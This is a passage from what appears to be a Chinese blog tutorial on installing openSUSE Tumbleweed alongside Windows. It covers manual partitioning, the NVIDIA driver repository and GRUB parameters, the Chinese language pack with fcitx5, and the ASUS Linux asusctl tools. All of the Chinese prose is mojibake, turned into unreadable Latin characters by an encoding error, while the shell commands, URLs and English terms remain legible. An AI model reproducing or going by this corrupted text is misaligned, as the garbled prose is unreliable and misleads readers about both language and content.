src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010630.png"></p><blockquote><p>å½“ç„¶ï¼Œ <em>æœ‰ä¸€ä¸ªå‘è¡Œç‰ˆæ˜¯å®Œå…¨è¿ä¸ä¸Šï¼Œæ˜¯è°å‘¢</em> ï¼š </p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010725.png"></p></blockquote><p>è¿™æ ·çš„è¯ç¬”è€…å®Œå…¨æ²¡æœ‰åŠæ³•åœ¨æœ¬åœ°æµ‹è¯•é¢˜ç›®ï¼Œå†åŠ ä¸Š Arch Linux ç”¨èµ·æ¥ <em>æ€»æ˜¯æ„Ÿè§‰æœ‰å“ªé‡Œæ²¡æœ‰é…å¥½çš„æ€ªå¼‚æ„Ÿ</em> ï¼Œåªé€‚åˆæ¯”è¾ƒé—²çš„æ—¶å€™æŠ˜è…¾ç©ç©ï¼Œæ—¥å¸¸ä½¿ç”¨æˆ–è®¸è¿˜æ˜¯ä¸€ä¸ªå¸¸è§„ç‚¹çš„å‘è¡Œç‰ˆä¼šæ›´åŠ å®‰å¿ƒä¸€äº›ï¼Œäºæ˜¯ç¬”è€…åœ¨ Fedora Workstation çŸ­æœŸé©»ç•™äº†ä¸€æ®µæ—¶é—´ä¹‹åé€‰æ‹©è½¬å‘ OpenSUSE Tumbleweed ï¼Œå’Œ Arch ä¸€æ ·æ˜¯ä¸€ä¸ªæ»šåŠ¨å‘è¡Œç‰ˆï¼Œä½†æ˜¯ <em>æ®è¯´å¾·å›½å·¥è‰ºæ¯”è¾ƒå€¼å¾—ä»¤äººä¿¡èµ–ï¼ŒSUSE åœ¨ä¼ä¸šå¸‚åœºçš„ä»½é¢ä¼¼ä¹ä¹Ÿä¸å°</em> ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124011110.png"></p><p>äº‹å®è¯æ˜ï¼ŒOpenSUSE Tumbleweed ç»™ç¬”è€…ä¸€ç§<strong>åˆå¥½åˆçƒ‚çš„æ„Ÿè§‰</strong>ï¼Œå¥½å°±å¥½åœ¨å¾·å›½å·¥è‰ºçš„ YaST ç¡®å®æ–¹ä¾¿æ˜“ç”¨ï¼Œå¯¹ KDE çš„é«˜é€‚é…æ€§è®©ç¬”è€…åœ¨ Fedora ä¸Šçš„å„ç§è‡ªå®šä¹‰ç¾åŒ–å·¥ä½œ <em>ä¸éœ€è¦ä»»ä½•ä¿®æ”¹ä¾¿èƒ½æ— ç¼è¿›è¡Œåç§»ï¼Œä»¿ä½›è‡ªå·±ä»æ¥æ²¡æœ‰æ¢è¿‡ç³»ç»Ÿä¸€èˆ¬ä»¤äººå®‰å¿ƒ</em> ï¼Œä¸å¥½å°±åœ¨äºå®˜æ–¹è‡ªå¸¦çš„ä¸­æ–‡å®‰è£…ä¾æ‰˜ç­”è¾©ï¼Œä¸ä»…å®‰è£…ç•Œé¢è¹¦æ–¹å—ï¼Œåˆ‡æ¢åˆ° Wayland åè‡ªå¸¦çš„ fcitx5 ç›´æ¥ç½¢å·¥ï¼ˆä¸æ­¤åŒæ—¶<strong>å…ˆè£…è‹±æ–‡ç³»ç»Ÿå†è£…ä¸­æ–‡è¯­è¨€åŒ…ä¸è¾“å…¥æ³•å´èƒ½æ­£å¸¸ä½¿ç”¨</strong>ï¼‰</p><p>ä½†è¿™å¹¶éæ˜¯æœ€è¦å‘½çš„ç‚¹ï¼Œ<strong>ç”¨çš„äººå°‘ã€ç¤¾åŒºæ´»è·ƒåº¦ä¸è¶³æ‰æ˜¯æœ€è‡´å‘½çš„</strong>ï¼ŒOpenSUSE æ—©æœŸåœ¨ä¸­å›½å¤§é™†å®£ä¼ ä¸è¶³ï¼ŒRHEL å’Œ Ubuntu è¿‘ä¹èš•é£Ÿæ‰æ‰€æœ‰çš„ Linux å¸‚åœºåæ‰å§—å§—æ¥è¿Ÿï¼Œ<strong>ç°åœ¨åœ¨ä¸­å›½å¤§é™†èƒ½ç”¨çš„é•œåƒç«™ä¼¼ä¹éƒ½ä¸å‰©å‡ ä¸ª</strong>ï¼Œ<a href="https://forum.suse.org.cn/">ä¸­æ–‡è®ºå›</a>æ´»è·ƒåº¦è¿˜æ¯”ä¸ä¸Šä¸€äº›å¿«æ­»äº†çš„è´´å§ï¼ˆ<a href="https://forums.opensuse.org/c/english/6">è‹±æ–‡è®ºå›</a>çš„æ´»è·ƒåº¦è¿˜å¯ä»¥ï¼Œä½†å…¶å®ä¹Ÿå·®ç‚¹æ„æ€ï¼‰ï¼ŒWiki å»ºè®¾åº¦ä¹Ÿä¸å¤ªè¶³ï¼Œè¿™å°±å¯¼è‡´å¾ˆå¤šé—®é¢˜åªèƒ½å‚ç…§å…¶ä»–å‘è¡Œç‰ˆçš„ç±»ä¼¼æƒ…å†µè‡ªå·±å†ç¼ç¼è¡¥è¡¥</p><blockquote><p>æœ€ç›´æ¥çš„åæœå°±æ˜¯åœ¨ç¼ºä¹æŒ‡å¼•çš„æƒ…å†µä¸‹ï¼Œç¬”è€…ç¬¬ä¸€æ¬¡åœ¨ç‰©ç†æœºä¸Šå°è¯• Tumbleweed æ—¶ docker ç›´æ¥æ— æ³•æ­£å¸¸æ‹‰é•œåƒï¼Œç¬¬äºŒæ¬¡åœ¨ç‰©ç†æœºä¸Šå°è¯• Tumbleweed æ—¶ç”±äºæœªæ›´æ–° GRUB é…ç½®å¯¼è‡´å‡ æ¬¡åœ¨å‡ æ¬¡é‡æ–°å¯åŠ¨ç³»ç»Ÿä¹‹å<strong>ç™»å½•ç•Œé¢ç›´æ¥è¿›ä¸å»äº†ï¼Œåªæœ‰ä¸€ä¸ªé¼ æ ‡èƒ½åŠ¨</strong>ï¼Œåˆ‡è¿› tty ä»¥åä¹Ÿä¸€ç­¹è«å±•ï¼ˆæ ¹æœ¬æ‰¾ä¸åˆ°ä½¿ç”¨ OpenSUSE å‡ºç°ç±»ä¼¼é—®é¢˜çš„æ¡ˆä¾‹ä¸è§£å†³æ–¹æ¡ˆï¼‰ï¼Œåœ¨é‡è£…äº†ä¸ƒå…«æ¬¡ç³»ç»ŸåæŒ‰ç…§ç¬¬ä¸‰æ–¹ç¤¾åŒº ASUS Linux çš„é…ç½®æ•™ç¨‹æ— æ„ä¸­è§£å†³äº†è¿™ä¸ªé—®é¢˜</p></blockquote><p>ä½†æ˜¯ <del>æŠ›å¼€äº‹å®ä¸è°ˆ</del>  <em>æŠ›å¼€è¿™äº›å°æ¯›ç—…ä¸è°ˆï¼ŒOpenSUSE ä¾æ—§æ˜¯åšå¾—ä¸é”™çš„å‘è¡Œç‰ˆ</em> ï¼ŒLeap æœ‰ç€è¶…ä¹æƒ³è±¡çš„ç¨³å®šæ€§ä¸ç»´æŠ¤å‘¨æœŸï¼ŒTumbleweed åœ¨ä¿è¯äº†å…¶ç¨³å®šæ€§çš„åŒæ—¶ä¾æ—§èƒ½ç´§è¿½æœ€å‰æ²¿çš„æŠ€æœ¯ï¼Œè™½ç„¶å›½å†…æ²¡å•¥äººç”¨ä½†åœ¨å›½å¤–å…¶å®è¿˜æ˜¯æœ‰ç€ä¸é”™çš„å£ç¢‘ï¼Œå› æ­¤ç¬”è€…æœ€ç»ˆé€‰æ‹©å°è¯•åœ¨ OpenSUSE Tumbleweed ä¸Šå¼€å§‹è‡ªå·±æ–°çš„æ—…ç¨‹</p><blockquote><p>è‡³äºä¸ºä»€ä¹ˆä¸ç”¨ Ubuntu æ˜¯å› ä¸º Ubuntu Desktop ä¾æ‰˜ç­”è¾©ï¼Œç»å¸¸èƒ½å¡å‡ºå„ç§ç„å­¦é—®é¢˜ï¼Œè½¯ä»¶åŒ…æ—§ä¸”éš¾é…ï¼Œsnap è¿™æ ·æ··æ²Œé‚ªæ¶çš„ä¸œè¥¿æ›´æ˜¯è®©äººè°”è°”ï¼Œåªé€‚åˆæ”¾æœåŠ¡å™¨ä¸Šæˆ–æ˜¯æ”¾åœ¨è™šæ‹Ÿæœºé‡Œç©</p><p>è‡³äºä¸ºä»€ä¹ˆä¸ç”¨ Debian åˆ™æ˜¯å› ä¸ºåœ¨ç¬”è€…æ„Ÿå—èµ·æ¥è¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ›´é€‚åˆåœ¨æœåŠ¡å™¨ä¸Šç¨³å®šè·‘åº”ç”¨çš„ç³»ç»Ÿï¼Œèƒ½æŠ˜è…¾çš„ç©ºé—´ä¹Ÿä¸å¤šï¼ˆ<del>å¹´è½»äººè‡ªå·±ç”¨çš„ç”µè„‘å½“ç„¶è¦æ»šåŠ¨å‘è¡Œç‰ˆå¤©å¤©æ»šï¼Œæˆ‘æ¯å¤©ç¨³å®šåœ¨ Arch ä¸Šæ»š 114 æ¬¡åœ¨centos stream ä¸Šæ»š 514 æ¬¡åœ¨ tumbleweed ä¸Šæ»š 1919 æ¬¡å¹¶ç”¨ Gentoo è‡ªè¡Œç¼–è¯‘ 810 æ¬¡</del>ï¼‰ï¼Œ <em>æ›´é‡è¦çš„æ˜¯</em> ç¬”è€…æ‰‹ä¸Šæ²¡æœ‰<a href="https://github.com/moesoha/debian-media-box">Debian ç›’è£…å®‰è£…åª’ä»‹</a> ï¼ˆç¬‘</p></blockquote><h1 id="0x01-å®‰è£…å‰çš„å‡†å¤‡å·¥ä½œ"><a href="#0x01-å®‰è£…å‰çš„å‡†å¤‡å·¥ä½œ" class="headerlink" title="0x01. å®‰è£…å‰çš„å‡†å¤‡å·¥ä½œ"></a>0x01. å®‰è£…å‰çš„å‡†å¤‡å·¥ä½œ</h1><blockquote><p>å¦‚æœè¦å’Œç¬”è€…ä¸€æ ·å®‰è£… Windows + Linux åŒç³»ç»Ÿçš„è¯<strong>å»ºè®®å…ˆå®‰è£… Windows</strong>ï¼Œå› ä¸ºå¦‚æœå…ˆå®‰è£… Linux çš„è¯ Windows ä¼šå¯¹ Linux ç©ºé—´ä¹±åŠ¨ï¼š(</p></blockquote><blockquote><p>å› ä¸ºå®‰è£…çš„æ—¶å€™æ²¡æœ‰æ‹å±æ‰€ä»¥ç”¨è™šæ‹Ÿæœºè¿›è¡Œæˆªå›¾ï¼Œ<del>æ¯•ç«Ÿæ€»ä¸èƒ½è®©ğŸ‘´æŠŠç°åœ¨å®‰å¥½çš„ç³»ç»Ÿå†é‡æ–°å®‰ä¸€éå§ï¼Œé‚£é—²å¾—æ²¡äº‹åšå±äºæ˜¯</del></p></blockquote><p>é¦–å…ˆè¿˜æ˜¯åœ¨ Windows ä¸Šæ‰“å¼€ <code>ç£ç›˜ç®¡ç†â†’å‹ç¼©å·</code> åˆ’å‡ºæ¥ä¸€å—æœªåˆ†é…ç©ºé—´ï¼Œåé¢æˆ‘ä»¬å°†åœ¨è¿™å—ç©ºé—´ä¸Šå®‰è£… OpenSUSE Tumbleweedï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231123234639.png"></p><p>ç„¶ååœ¨<a href="https://get.opensuse.org/tumbleweed/#download">å®˜ç½‘</a>ä¸‹è½½é•œåƒï¼Œå¹¶çƒ§å½•åˆ° U ç›˜ä¸­ï¼ˆå¤§å®¶åº”è¯¥éƒ½å’Œç¬”è€…ä¸€æ ·ä½¿ç”¨ U ç›˜è¿›è¡Œå®‰è£…å§ï¼‰ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©ä½¿ç”¨ <a href="https://etcher.balena.io/#download-etcher">balenaEtcher</a> è¿›è¡Œçƒ§å½•ï¼Œç›´æ¥é€‰æ‹©é•œåƒå’Œ U ç›˜å°±è¡Œï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231123235028.png"></p><h1 id="0x02-å®‰è£…-OpenSUSE-Tumbleweed"><a href="#0x02-å®‰è£…-OpenSUSE-Tumbleweed" class="headerlink" title="0x02. å®‰è£… OpenSUSE Tumbleweed"></a>0x02. å®‰è£… OpenSUSE Tumbleweed</h1><p>OpenSUSE ç³»ç»Ÿä½¿ç”¨ <code>YaST</code> è¿›è¡Œå®‰è£…ï¼Œéå¸¸åœ°èˆ’é€‚ç®€ä¾¿çš„åŒæ—¶ä¹Ÿæä¾›ç»™æˆ‘ä»¬è®¸å¤šå¯ä»¥å®¢åˆ¶åŒ–çš„åœ°æ–¹</p><blockquote><p>å’Œå‰é¢ä¸€æ ·éƒ½æ˜¯åœ¨è™šæ‹Ÿæœºä¸­é‡æ–°æˆªçš„å›¾ï¼Œå› ä¸ºç¬”è€…å®‰è£…æ—¶å¿˜äº†æ‹äº†ï¼šï¼‰</p></blockquote><p>æƒ¯ä¾‹é‡å¯è¿›å…¥ UEFI ç•Œé¢å…³é—­å®‰å…¨å¯åŠ¨å°† U ç›˜è®¾ä¸ºç¬¬ä¸€ä¸ªå¯åŠ¨é¡¹è¿›å…¥ OpenSUSE Tumbleweed çš„å®‰è£…ç•Œé¢ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124003638.png"></p><blockquote><p>å¦‚æœä½ æ˜¯ç‰©ç†æœºå®‰è£…è€Œä¸”æ²¡æ’ç½‘çº¿ä¼šæœ‰ä¸€ä¸ªé¢å¤–çš„é…ç½®ç½‘ç»œçš„ç¯èŠ‚ï¼ŒæŒ‰ç…§æŒ‡å¼•æ­£å¸¸é€‰æ‹©æ— çº¿ç½‘å¡è¿ WiFi å°±è¡Œ</p></blockquote><p>è¿™é‡Œæ³¨æ„<strong>å®‰è£…è¯­è¨€é€‰æ‹© English</strong>ï¼Œå› ä¸ºè‡ªå¸¦çš„ä¸­æ–‡å®‰è£…æœ‰äº›å°é—®é¢˜ï¼ˆ<a href="https://www.bilibili.com/video/BV1F7411G7jH/?t=2095">ä»–ä»¬é‚£ä¸ªæ˜¯æœ‰ç‚¹å·®çš„.avi</a>ï¼‰ï¼Œç³»ç»Ÿå®‰è£…ç»“æŸåæˆ‘ä»¬å†æ‰‹åŠ¨åœ¨ç³»ç»Ÿä¸­å»å®‰è£…ä¸­æ–‡ç›¸å…³çš„ä¸œè¥¿ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124004125.png"></p><p>Online Repositories å»ºè®®å…¨é€‰ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124004637.png"></p><p>æ¡Œé¢å°±æŒ‰éœ€é€‰æ‹©äº†ï¼Œç¬”è€…æ¨èé€‰æ‹© OpenSUSE é»˜è®¤çš„ KDE Plasma ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124005130.png"></p><p>ç¡¬ç›˜åˆ†åŒºçš„è¯ç¬”è€…å»ºè®®è¿˜æ˜¯<strong>æ‰‹åŠ¨åˆ†åŒº</strong>ï¼ˆé€‰æ‹©ä¸‹æ–¹çš„ <code>Expert Partitioner</code> æŒ‰é’®ä¸­çš„ <code>Start with Existing Partitions</code>ï¼Œä¹‹åç›´æ¥é€‰ä¸­å¯¹åº”ç¡¬ç›˜å¹¶ <code>Add Partion...</code> å°±ä¼šæœ‰éå¸¸ç»†è‡´çš„åˆ†åŒºåˆ›å»ºå¼•å¯¼ï¼‰ï¼Œå› ä¸ºä»–è‡ªåŠ¨åˆ†åŒºçš„é€»è¾‘æœ‰ç‚¹æ€ªæ€ªçš„ï¼ˆä¹‹å‰è‡ªåŠ¨åˆ†åŒºå·®ç‚¹æŠŠç¬”è€…åŸæœ¬çš„æ•°æ®ç›˜ç»™æŠ¹äº†ï¼‰ï¼Œä¸»è¦æ˜¯ä¸¤ä¸ªåˆ†åŒºï¼š</p><ul><li>EFI åˆ†åŒºï¼ˆ<code>EFI Boot Partion</code>ï¼Œ<strong>å¿…é¡»ä¸º fat32 æ ¼å¼</strong>ï¼‰ï¼šæ”¾ GRUB å’Œå†…æ ¸çš„åœ°æ–¹ï¼Œç”¨æ¥å¯åŠ¨ç³»ç»Ÿï¼Œéœ€è¦æŒ‚è½½åœ¨ <code>/boot/efi</code> ä¸‹è¾¹</li><li>ç³»ç»Ÿåˆ†åŒºï¼ˆ<code>Operating System</code>ï¼Œæ¨èè¿˜æ˜¯ ext4ï¼Œbrtfs å¼ºåˆ¶é‡å¯ä¼šç‚¸ï¼‰ï¼šç³»ç»ŸåŸºæœ¬ç¯å¢ƒï¼Œéœ€è¦æŒ‚è½½åœ¨ <code>/</code> ä¸‹è¾¹</li></ul><blockquote><p>è¿™é‡Œç¬”è€…<strong>ä¸æ¨èå’Œ Windows æ··ç”¨åŒä¸€ä¸ª EFI åˆ†åŒº</strong>ï¼Œæœ€å¥½è‡ªå·±è‡ªç«‹é—¨æˆ·ï¼Œä¸€æ˜¯ Win åŸæœ¬çš„ EFI åˆ†åŒºå®åœ¨å¤ªå°éšä¾¿å¡ç‚¹ä¸œè¥¿å°±çˆ†äº†ï¼ŒäºŒæ˜¯ç‹¬ç«‹åˆ†åŒºå¹²å•¥éƒ½æ–¹ä¾¿ä¸ä¼šå½±å“åˆ°éš”å£çš„ Win</p></blockquote><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥åƒç¬”è€…ä¸€æ ·é¢å¤–åˆ†ä¸€ä¸ªåˆ†åŒºåšæ•°æ®åˆ†åŒºæŒ‚åœ¨ <code>/home</code> ä¸‹è¾¹ï¼Œåé¢é‡è£…å„ç§å…¶ä»–å‘è¡Œç‰ˆéƒ½æ–¹ä¾¿ï¼Œ <em>å› ä¸ºè¿™é‡Œæ˜¯è™šæ‹Ÿæœºæ¼”ç¤ºæ‰€ä»¥å°±åªåˆ†äº†ä¸¤ä¸ªåˆ†åŒº</em> ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124005751.png"></p><p>æ—¶åŒºè®¾ç½®å’Œåˆ›å»ºç”¨æˆ·è¿™ç§å¸¸è§„æ“ä½œç¬”è€…å°±ä¸æˆªå›¾äº†ï¼Œæœ€åæ¥åˆ°å®‰è£…å‰çš„æœ€åç¡®è®¤ç¯èŠ‚ï¼Œè¿™é‡Œç¬”è€…å»ºè®®æŠŠ Secure Boot ç»™å…³äº†ï¼Œä¸ç„¶åé¢å‡çº§é—­æºæ˜¾å¡é©±åŠ¨å¯èƒ½ä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œ<del>ä»¥åŠç¬”è€…è§‰å¾—è¿™ä¸ªç‰¹æ€§åœ¨ä¸ªäººç”µè„‘ä¸Šå®Œå…¨æ²¡å¿…è¦ï¼ŒçœŸæœ‰äººä¼šæ¥æ‰“å—</del></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010003.png"></p><p>å®‰è£…å¥½åä¼šè‡ªåŠ¨é‡å¯ï¼Œè¿™ä¸ªæ—¶å€™é»˜è®¤è¿›çš„å°±æ˜¯ GRUB ç•Œé¢äº†ï¼Œå¯ä»¥é€‰æ‹©è¿›å…¥ Windows è¿˜æ˜¯ Linuxï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124013040.png"></p><p>è¿™é‡Œä¸å¾—ä¸å¤¸çš„ä¸€ç‚¹æ˜¯<strong>OpenSUSE æ— ç¼åœ°å°†ç¬”è€…ä¹‹å‰çš„ KDE ç¾åŒ–ç»™è¿ç§»äº†è¿‡æ¥</strong>ï¼ˆå½“ç¬”è€…ä» Arch å¾€ Fedora ä¸Šè¿ç§»æ—¶ã€é‡æ–°å®‰è£… Fedora æ—¶ï¼Œè¿™å—éƒ½æ²¡å¤ªèƒ½å¤„ç†å¥½ï¼‰ï¼ŒæŠŠ <code>latte-dock</code> ç»™å®‰è£…ä¸Šä¹‹åç¬”è€…å°±åƒæ²¡æ¢è¿‡ç³»ç»Ÿä¸€æ ·ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/img_v3_025f_b217ee22-634c-432b-95ad-8c5569d0081g.jpg"></p><h1 id="0x03-å®‰è£…-N-å¡é—­æºé©±åŠ¨"><a href="#0x03-å®‰è£…-N-å¡é—­æºé©±åŠ¨" class="headerlink" title="0x03. å®‰è£… N å¡é—­æºé©±åŠ¨"></a>0x03. å®‰è£… N å¡é—­æºé©±åŠ¨</h1><blockquote><p>å¦‚æœä½ ç”¨çš„æ˜¯ A å¡æˆ–è€…ä»…æœ‰æ ¸æ˜¾ï¼Œåˆ™å¯ä»¥è·³è¿‡è¿™ä¸€ç« èŠ‚</p></blockquote><p>YaST æ˜¯å¾ˆå¥½å¾ˆå¼ºå¤§çš„ä¸€ä¸ªç»¼åˆæ€§å·¥å…·ï¼Œè¿™ä¹Ÿæ˜¯ SUSE ç³»å‘è¡Œç‰ˆçš„é­…åŠ›ä¹‹ä¸€ï¼Œé€šè¿‡ YaSTå¯ä»¥éå¸¸æ–¹ä¾¿åœ°ç®¡ç†åŒ…æ‹¬è½¯ä»¶å®‰è£…åœ¨å†…çš„å„é¡¹ç³»ç»Ÿé…ç½®</p><p>é¦–å…ˆç”¨ zypper å¼•å…¥ Nvidia é©±åŠ¨ä»“åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper addrepo --refresh https://download.nvidia.com/opensuse/tumbleweed NVIDIA<br></code></pre></td></tr></table></figure><p>ç„¶åæ‰“å¼€ <code>YaST-&gt;Software Management</code>ï¼Œå¥¹ä¼šç›´æ¥å¸®ä½ é€‰å¥½éœ€è¦å®‰è£…çš„åŒ…ï¼Œç›´æ¥å®‰å°±å®Œäº‹äº†ï¼šï¼‰</p><p>å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥æ‰‹åŠ¨è¿›å…¥ <code>YaST-&gt;Software Management-&gt;View-&gt;Repositories-&gt;NVIDIA</code> é€‰æ‹©è¦å®‰è£…å“ªäº›åŒ…ï¼Œä¸€èˆ¬æ¥è¯´æœ€æ–°çš„ NVIDIA æ˜¾å¡ç›´æ¥é€‰æ‹©æœ€æ–°çš„ <code>G06</code> ç›¸å…³å¥—ä»¶å³å¯ï¼Œå…¶ä»–çš„è€æ˜¾å¡å»ºè®®å‚è€ƒ <a href="https://en.opensuse.org/SDB:NVIDIA_drivers">OpenSUSE Wiki</a>ï¼Œä»¥ç¬”è€…çš„ç”µè„‘ä¸ºä¾‹å®‰è£…äº†ä»¥ä¸‹è¿™äº›åŒ…ï¼š</p><p><img src="https://s2.loli.net/2023/11/23/dbWQVyqU7Z1A9SN.png"></p><p>å®‰è£…è¿‡ç¨‹ä¸­ YaST ä¼šè‡ªåŠ¨å¸®ä½ æŠŠ <code>nouveau</code> ç»™ç¦ç”¨äº†ï¼Œå®Œæˆä¹‹åç›´æ¥é‡å¯ï¼Œåœ¨ç»ˆç«¯è¾“å…¥ <code>nvidia-smi</code> å°±å¯ä»¥çœ‹åˆ°æ˜¾å¡ç›¸å…³ä¿¡æ¯ï¼š</p><p><img src="https://s2.loli.net/2023/11/23/t9Qak3RJx7Yq4Xu.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æ›´æ–° Grub é…ç½®ï¼Œä¸æ›´æ–°çš„è¯å¤šé‡å¯å‡ æ¬¡å¯èƒ½æ¡Œé¢å°±ä¼šè«åå…¶å¦™å¯„äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo vim /etc/default/grub<br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­æ‰¾åˆ° <code>GRUB_CMDLINE_LINUX</code> ï¼Œåœ¨å…¶ä¸­åŠ å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">modprobe.<span class="hljs-attribute">blacklist</span>=nouveau rd.driver.<span class="hljs-attribute">blacklist</span>=nouveau nvidia-drm.<span class="hljs-attribute">modeset</span>=1<br></code></pre></td></tr></table></figure><p>åº”ç”¨æ–°çš„ GRUB é…ç½®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo grub2-mkconfig -o /boot/grub2/grub.cfg<br></code></pre></td></tr></table></figure><h1 id="0x04-å®‰è£…ä¸­æ–‡ä¸è¾“å…¥æ³•"><a href="#0x04-å®‰è£…ä¸­æ–‡ä¸è¾“å…¥æ³•" class="headerlink" title="0x04. å®‰è£…ä¸­æ–‡ä¸è¾“å…¥æ³•"></a>0x04. å®‰è£…ä¸­æ–‡ä¸è¾“å…¥æ³•</h1><p>OpenSUSE Tumbleweed å®‰è£…åª’ä»‹ä¸­è‡ªå¸¦çš„ä¸­æ–‡æœ‰äº›é—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å®‰è£… English ç³»ç»Ÿåæ‰‹åŠ¨å°†ä¸­æ–‡ç»™å®‰è£…ä¸Š</p><p>é¦–å…ˆæ˜¯å°†ç®€ä½“ä¸­æ–‡æ·»åŠ ä¸ºç¬¬äºŒè¯­è¨€ï¼ˆç¬”è€…ä¸æ¨èä½œä¸ºç¬¬ä¸€è¯­è¨€ï¼Œå¦åˆ™ä¸‡ä¸€ç³»ç»Ÿå´©äº†ä»¥åè¿›å…¥ tty æŠ¢æ•‘çš„æ—¶å€™ä¼šè®©ä½ æ„Ÿåˆ°å¾ˆå´©æºƒï¼‰ï¼Œæ‰“å¼€ <code>YaST-&gt;System-&gt;Language</code>ï¼Œå‹¾ä¸Š <code>Simplified Chinese</code> åç›´æ¥ç‚¹ <code>OK</code> å°±å¯ä»¥è‡ªåŠ¨å®‰è£…äº†ï¼š</p><p><img src="https://s2.loli.net/2023/11/23/pe6DK84kNB3cSZj.png" alt="image.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„è¿›åº¦æ¡ä¼šè«åå…¶å¦™å˜æˆè´Ÿæ•°ï¼Œ<strong>ä¸å½±å“æ­£å¸¸å®‰è£…</strong>ï¼Œåªæ˜¯æˆ‘ä»¬ä¸èƒ½çœ‹åˆ°æ­£ç¡®çš„è¿›åº¦ç½¢äº†ï¼Œæ…¢æ…¢ç­‰å°±è¡Œäº†ï¼š</p><p><img src="https://s2.loli.net/2023/11/23/AWh6xErjFi8XVTN.jpg"></p><p>å®Œæˆä¸­æ–‡çš„å®‰è£…ä¹‹åæ¥ä¸‹æ¥æˆ‘ä»¬æ¥å®‰è£…è¾“å…¥æ³•ï¼Œç›®å‰ Linux ä¸‹æœ€ç«çš„ä¸­æ–‡è¾“å…¥æ³•ä¹‹ä¸€ä¸º <code>fcitx</code>ï¼Œç›´æ¥é€šè¿‡ zypper è¿›è¡Œå®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in fcitx5<br></code></pre></td></tr></table></figure><p>ä¹‹åç›´æ¥é‡å¯å°± ok äº†ï¼Œå°±åƒåœ¨å…¶ä»–å‘è¡Œç‰ˆä¸Šé‚£æ ·æ­£å¸¸ç›´æ¥ä½¿ç”¨ fcitx å³å¯ï¼š</p><p><img src="https://s2.loli.net/2023/11/23/MPsnu5im38qRI2G.png" alt="image.png"></p><h1 id="0x05-ASUS-Laptop-ç›¸å…³çš„ä¸€äº›é…ç½®"><a href="#0x05-ASUS-Laptop-ç›¸å…³çš„ä¸€äº›é…ç½®" class="headerlink" title="0x05. ASUS Laptop ç›¸å…³çš„ä¸€äº›é…ç½®"></a>0x05. ASUS Laptop ç›¸å…³çš„ä¸€äº›é…ç½®</h1><blockquote><p>å¦‚æœä½ çš„ç”µè„‘ä¸æ˜¯åç¡•ç¬”è®°æœ¬ï¼Œå¯ä»¥ç›´æ¥è·³è¿‡è¿™ä¸€éƒ¨åˆ†</p></blockquote><p><a href="https://asus-linux.org/">ASUS Linux</a> æ˜¯ä¸€ä¸ªä¸º ASUS Laptop æä¾›é¢å¤–æ”¯æŒçš„æ°‘é—´ç¤¾åŒºï¼Œé€šè¿‡ <code>asusctl</code> ä¸ <code>supergfxctl</code> è¿™ä¸¤ä¸ªå·¥å…·æˆ‘ä»¬å¯ä»¥éå¸¸æ–¹ä¾¿åœ°é…ç½®ç¬”è®°æœ¬çš„å„ç§é…ç½®</p><p>é¦–å…ˆå¼•å…¥ ASUS Linux çš„ä»“åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper ar --priority 50 --refresh https://download.opensuse.org/repositories/home:/luke_nukem:/asus/openSUSE_Tumbleweed/ asus-linux<br></code></pre></td></tr></table></figure><p>å®‰è£… <code>asusctl</code>ï¼Œå¹¶ç”¨ <code>power-profiles-daemon</code> æ›¿æ¢æ‰ <code>tlp</code> ä½œä¸ºé»˜è®¤çš„ç”µæºç®¡ç†æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper rm tlp<br>sudo zypper in asusctl<br>sudo zypper in power-profiles-daemon<br>sudo systemctl enable --now power-profiles-daemon.service<br>sudo systemctl start asusd<br></code></pre></td></tr></table></figure><p>ä¸ºäº†ä¿å…»ç”µæ± ï¼Œå¯ä»¥ç”¨ <code>asusctl</code> å°†æœ€å¤§å……ç”µé™åˆ¶åœ¨ 80ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo asusctl 